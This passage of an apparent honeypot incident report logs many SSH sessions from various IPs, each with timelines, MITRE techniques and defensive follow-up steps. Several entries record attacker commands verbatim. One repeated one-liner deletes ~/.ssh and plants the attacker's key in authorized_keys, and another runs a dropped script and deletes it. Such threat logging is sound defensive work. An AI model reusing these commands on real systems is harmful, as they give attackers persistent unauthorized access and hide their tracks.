- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2b92da805e

| Field | Detail |
|---|---|
| **Source IP** | `103.67.162[.]139` |
| **First Seen** | 2026-07-03 22:04 |
| **Last Seen** | 2026-07-03 22:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:04:13` | `cowrie.session.connect` |
| `2026-07-03 22:04:13` | `cowrie.client.version` |
| `2026-07-03 22:04:13` | `cowrie.client.kex` |
| `2026-07-03 22:04:14` | `cowrie.login.success` |
| `2026-07-03 22:04:15` | `cowrie.session.params` |
| `2026-07-03 22:04:15` | `cowrie.command.input` |
| `2026-07-03 22:04:15` | `cowrie.command.failed` |
| `2026-07-03 22:04:16` | `cowrie.log.closed` |
| `2026-07-03 22:04:17` | `cowrie.session.params` |
| `2026-07-03 22:04:17` | `cowrie.command.input` |
| `2026-07-03 22:04:17` | `cowrie.session.file_download` |
| `2026-07-03 22:04:17` | `cowrie.log.closed` |
| `2026-07-03 22:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.162[.]139` to AbuseIPDB if not already reported
- [ ] Block `103.67.162[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b612409f9ee8

| Field | Detail |
|---|---|
| **Source IP** | `103.67.162[.]139` |
| **First Seen** | 2026-07-03 22:04 |
| **Last Seen** | 2026-07-03 22:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:04:17` | `cowrie.session.connect` |
| `2026-07-03 22:04:17` | `cowrie.client.version` |
| `2026-07-03 22:04:17` | `cowrie.client.kex` |
| `2026-07-03 22:04:18` | `cowrie.login.success` |
| `2026-07-03 22:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.162[.]139` to AbuseIPDB if not already reported
- [ ] Block `103.67.162[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-331dd0d6c14b

| Field | Detail |
|---|---|
| **Source IP** | `103.67.162[.]139` |
| **First Seen** | 2026-07-03 22:04 |
| **Last Seen** | 2026-07-03 22:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:04:19` | `cowrie.session.connect` |
| `2026-07-03 22:04:19` | `cowrie.client.version` |
| `2026-07-03 22:04:19` | `cowrie.client.kex` |
| `2026-07-03 22:04:20` | `cowrie.login.success` |
| `2026-07-03 22:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.162[.]139` to AbuseIPDB if not already reported
- [ ] Block `103.67.162[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b2abe96f09

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-03 22:04 |
| **Last Seen** | 2026-07-03 22:06 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:04:31` | `cowrie.session.connect` |
| `2026-07-03 22:04:31` | `cowrie.client.version` |
| `2026-07-03 22:04:31` | `cowrie.client.kex` |
| `2026-07-03 22:04:32` | `cowrie.login.success` |
| `2026-07-03 22:04:34` | `cowrie.session.file_upload` |
| `2026-07-03 22:04:35` | `cowrie.session.params` |
| `2026-07-03 22:04:35` | `cowrie.command.input` |
| `2026-07-03 22:04:35` | `cowrie.command.input` |
| `2026-07-03 22:04:35` | `cowrie.command.input` |
| `2026-07-03 22:04:35` | `cowrie.command.failed` |
| `2026-07-03 22:04:35` | `cowrie.log.closed` |
| `2026-07-03 22:04:36` | `cowrie.session.params` |
| `2026-07-03 22:04:36` | `cowrie.command.input` |
| `2026-07-03 22:04:37` | `cowrie.log.closed` |
| `2026-07-03 22:04:38` | `cowrie.session.params` |
| `2026-07-03 22:04:38` | `cowrie.command.input` |
| `2026-07-03 22:04:38` | `cowrie.log.closed` |
| `2026-07-03 22:04:39` | `cowrie.session.params` |
| `2026-07-03 22:04:39` | `cowrie.command.input` |
| `2026-07-03 22:04:39` | `cowrie.command.failed` |
| `2026-07-03 22:04:39` | `cowrie.command.failed` |
| `2026-07-03 22:05:40` | `cowrie.session.params` |
| `2026-07-03 22:05:40` | `cowrie.command.input` |
| `2026-07-03 22:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d3ced004025

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 22:05 |
| **Last Seen** | 2026-07-03 22:05 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:05:39` | `cowrie.session.connect` |
| `2026-07-03 22:05:40` | `cowrie.client.version` |
| `2026-07-03 22:05:40` | `cowrie.client.kex` |
| `2026-07-03 22:05:46` | `cowrie.login.success` |
| `2026-07-03 22:05:49` | `cowrie.session.params` |
| `2026-07-03 22:05:49` | `cowrie.command.input` |
| `2026-07-03 22:05:51` | `cowrie.log.closed` |
| `2026-07-03 22:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c14c356c575d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 22:06 |
| **Last Seen** | 2026-07-03 22:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:06:14` | `cowrie.session.connect` |
| `2026-07-03 22:06:14` | `cowrie.client.version` |
| `2026-07-03 22:06:14` | `cowrie.client.kex` |
| `2026-07-03 22:06:15` | `cowrie.login.success` |
| `2026-07-03 22:06:16` | `cowrie.session.params` |
| `2026-07-03 22:06:16` | `cowrie.command.input` |
| `2026-07-03 22:06:16` | `cowrie.log.closed` |
| `2026-07-03 22:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc125499b0f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 22:17 |
| **Last Seen** | 2026-07-03 22:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:17:23` | `cowrie.session.connect` |
| `2026-07-03 22:17:25` | `cowrie.client.version` |
| `2026-07-03 22:17:25` | `cowrie.client.kex` |
| `2026-07-03 22:17:31` | `cowrie.login.success` |
| `2026-07-03 22:17:34` | `cowrie.session.params` |
| `2026-07-03 22:17:34` | `cowrie.command.input` |
| `2026-07-03 22:17:35` | `cowrie.log.closed` |
| `2026-07-03 22:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb5e2688ccf

| Field | Detail |
|---|---|
| **Source IP** | `34.38.159[.]252` |
| **First Seen** | 2026-07-03 22:21 |
| **Last Seen** | 2026-07-03 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:21:17` | `cowrie.session.connect` |
| `2026-07-03 22:21:17` | `cowrie.login.success` |
| `2026-07-03 22:21:18` | `cowrie.session.params` |
| `2026-07-03 22:21:18` | `cowrie.command.input` |
| `2026-07-03 22:21:18` | `cowrie.command.input` |
| `2026-07-03 22:21:18` | `cowrie.command.failed` |
| `2026-07-03 22:21:18` | `cowrie.command.input` |
| `2026-07-03 22:21:18` | `cowrie.log.closed` |
| `2026-07-03 22:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.159[.]252` to AbuseIPDB if not already reported
- [ ] Block `34.38.159[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a842fc5a33d3

| Field | Detail |
|---|---|
| **Source IP** | `34.38.159[.]252` |
| **First Seen** | 2026-07-03 22:21 |
| **Last Seen** | 2026-07-03 22:23 |
| **Session Duration** | 95s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:21:31` | `cowrie.session.connect` |
| `2026-07-03 22:21:31` | `cowrie.login.success` |
| `2026-07-03 22:21:31` | `cowrie.session.params` |
| `2026-07-03 22:21:31` | `cowrie.command.input` |
| `2026-07-03 22:21:31` | `cowrie.command.failed` |
| `2026-07-03 22:23:06` | `cowrie.log.closed` |
| `2026-07-03 22:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.159[.]252` to AbuseIPDB if not already reported
- [ ] Block `34.38.159[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2965f8733c

| Field | Detail |
|---|---|
| **Source IP** | `34.38.159[.]252` |
| **First Seen** | 2026-07-03 22:21 |
| **Last Seen** | 2026-07-03 22:23 |
| **Session Duration** | 93s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:21:33` | `cowrie.session.connect` |
| `2026-07-03 22:21:33` | `cowrie.login.success` |
| `2026-07-03 22:21:33` | `cowrie.session.params` |
| `2026-07-03 22:21:33` | `cowrie.command.input` |
| `2026-07-03 22:23:06` | `cowrie.log.closed` |
| `2026-07-03 22:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.159[.]252` to AbuseIPDB if not already reported
- [ ] Block `34.38.159[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b053b3b34a

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]4` |
| **First Seen** | 2026-07-03 22:26 |
| **Last Seen** | 2026-07-03 22:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:26:44` | `cowrie.session.connect` |
| `2026-07-03 22:26:44` | `cowrie.client.version` |
| `2026-07-03 22:26:45` | `cowrie.client.kex` |
| `2026-07-03 22:26:45` | `cowrie.login.success` |
| `2026-07-03 22:26:46` | `cowrie.session.params` |
| `2026-07-03 22:26:46` | `cowrie.command.input` |
| `2026-07-03 22:26:46` | `cowrie.command.failed` |
| `2026-07-03 22:26:47` | `cowrie.log.closed` |
| `2026-07-03 22:26:48` | `cowrie.session.params` |
| `2026-07-03 22:26:48` | `cowrie.command.input` |
| `2026-07-03 22:26:48` | `cowrie.session.file_download` |
| `2026-07-03 22:26:48` | `cowrie.log.closed` |
| `2026-07-03 22:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]4` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc982b2d4698

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]4` |
| **First Seen** | 2026-07-03 22:26 |
| **Last Seen** | 2026-07-03 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:26:48` | `cowrie.session.connect` |
| `2026-07-03 22:26:48` | `cowrie.client.version` |
| `2026-07-03 22:26:48` | `cowrie.client.kex` |
| `2026-07-03 22:26:49` | `cowrie.login.success` |
| `2026-07-03 22:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]4` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d37af9f979f

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]4` |
| **First Seen** | 2026-07-03 22:26 |
| **Last Seen** | 2026-07-03 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:26:49` | `cowrie.session.connect` |
| `2026-07-03 22:26:49` | `cowrie.client.version` |
| `2026-07-03 22:26:50` | `cowrie.client.kex` |
| `2026-07-03 22:26:50` | `cowrie.login.success` |
| `2026-07-03 22:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]4` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cd76e59c68

| Field | Detail |
|---|---|
| **Source IP** | `154.90.70[.]69` |
| **First Seen** | 2026-07-03 22:27 |
| **Last Seen** | 2026-07-03 22:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, uname -h, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:27:55` | `cowrie.session.connect` |
| `2026-07-03 22:27:57` | `cowrie.login.success` |
| `2026-07-03 22:27:57` | `cowrie.session.params` |
| `2026-07-03 22:27:58` | `cowrie.command.input` |
| `2026-07-03 22:27:59` | `cowrie.command.input` |
| `2026-07-03 22:27:59` | `cowrie.command.input` |
| `2026-07-03 22:28:00` | `cowrie.command.input` |
| `2026-07-03 22:28:00` | `cowrie.command.input` |
| `2026-07-03 22:28:00` | `cowrie.command.failed` |
| `2026-07-03 22:28:01` | `cowrie.log.closed` |
| `2026-07-03 22:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.90.70[.]69` to AbuseIPDB if not already reported
- [ ] Block `154.90.70[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-485ec35291fc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 22:29 |
| **Last Seen** | 2026-07-03 22:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:29:21` | `cowrie.session.connect` |
| `2026-07-03 22:29:22` | `cowrie.client.version` |
| `2026-07-03 22:29:22` | `cowrie.client.kex` |
| `2026-07-03 22:29:28` | `cowrie.login.success` |
| `2026-07-03 22:29:32` | `cowrie.session.params` |
| `2026-07-03 22:29:32` | `cowrie.command.input` |
| `2026-07-03 22:29:34` | `cowrie.log.closed` |
| `2026-07-03 22:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d778f2e098e9

| Field | Detail |
|---|---|
| **Source IP** | `115.68.208[.]117` |
| **First Seen** | 2026-07-03 22:31 |
| **Last Seen** | 2026-07-03 22:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:31:37` | `cowrie.session.connect` |
| `2026-07-03 22:31:37` | `cowrie.client.version` |
| `2026-07-03 22:31:37` | `cowrie.client.kex` |
| `2026-07-03 22:31:38` | `cowrie.login.success` |
| `2026-07-03 22:31:39` | `cowrie.session.params` |
| `2026-07-03 22:31:39` | `cowrie.command.input` |
| `2026-07-03 22:31:39` | `cowrie.command.failed` |
| `2026-07-03 22:31:39` | `cowrie.log.closed` |
| `2026-07-03 22:31:40` | `cowrie.session.params` |
| `2026-07-03 22:31:40` | `cowrie.command.input` |
| `2026-07-03 22:31:40` | `cowrie.session.file_download` |
| `2026-07-03 22:31:40` | `cowrie.log.closed` |
| `2026-07-03 22:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.208[.]117` to AbuseIPDB if not already reported
- [ ] Block `115.68.208[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f7810da434d

| Field | Detail |
|---|---|
| **Source IP** | `115.68.208[.]117` |
| **First Seen** | 2026-07-03 22:31 |
| **Last Seen** | 2026-07-03 22:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:31:40` | `cowrie.session.connect` |
| `2026-07-03 22:31:40` | `cowrie.client.version` |
| `2026-07-03 22:31:41` | `cowrie.client.kex` |
| `2026-07-03 22:31:42` | `cowrie.login.success` |
| `2026-07-03 22:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.208[.]117` to AbuseIPDB if not already reported
- [ ] Block `115.68.208[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac7cbe74a793

| Field | Detail |
|---|---|
| **Source IP** | `115.68.208[.]117` |
| **First Seen** | 2026-07-03 22:31 |
| **Last Seen** | 2026-07-03 22:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:31:42` | `cowrie.session.connect` |
| `2026-07-03 22:31:42` | `cowrie.client.version` |
| `2026-07-03 22:31:42` | `cowrie.client.kex` |
| `2026-07-03 22:31:43` | `cowrie.login.success` |
| `2026-07-03 22:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.208[.]117` to AbuseIPDB if not already reported
- [ ] Block `115.68.208[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b10c46cd40

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
| **First Seen** | 2026-07-03 22:39 |
| **Last Seen** | 2026-07-03 22:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:39:24` | `cowrie.session.connect` |
| `2026-07-03 22:39:24` | `cowrie.client.version` |
| `2026-07-03 22:39:24` | `cowrie.client.kex` |
| `2026-07-03 22:39:25` | `cowrie.login.success` |
| `2026-07-03 22:39:26` | `cowrie.session.params` |
| `2026-07-03 22:39:26` | `cowrie.command.input` |
| `2026-07-03 22:39:26` | `cowrie.command.failed` |
| `2026-07-03 22:39:27` | `cowrie.log.closed` |
| `2026-07-03 22:39:27` | `cowrie.session.params` |
| `2026-07-03 22:39:27` | `cowrie.command.input` |
| `2026-07-03 22:39:28` | `cowrie.session.file_download` |
| `2026-07-03 22:39:28` | `cowrie.log.closed` |
| `2026-07-03 22:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83f8c2f20a87

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
| **First Seen** | 2026-07-03 22:39 |
| **Last Seen** | 2026-07-03 22:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:39:28` | `cowrie.session.connect` |
| `2026-07-03 22:39:28` | `cowrie.client.version` |
| `2026-07-03 22:39:28` | `cowrie.client.kex` |
| `2026-07-03 22:39:29` | `cowrie.login.success` |
| `2026-07-03 22:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0673450130ba

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
| **First Seen** | 2026-07-03 22:39 |
| **Last Seen** | 2026-07-03 22:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:39:30` | `cowrie.session.connect` |
| `2026-07-03 22:39:30` | `cowrie.client.version` |
| `2026-07-03 22:39:30` | `cowrie.client.kex` |
| `2026-07-03 22:39:31` | `cowrie.login.success` |
| `2026-07-03 22:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4260010625b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 22:41 |
| **Last Seen** | 2026-07-03 22:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
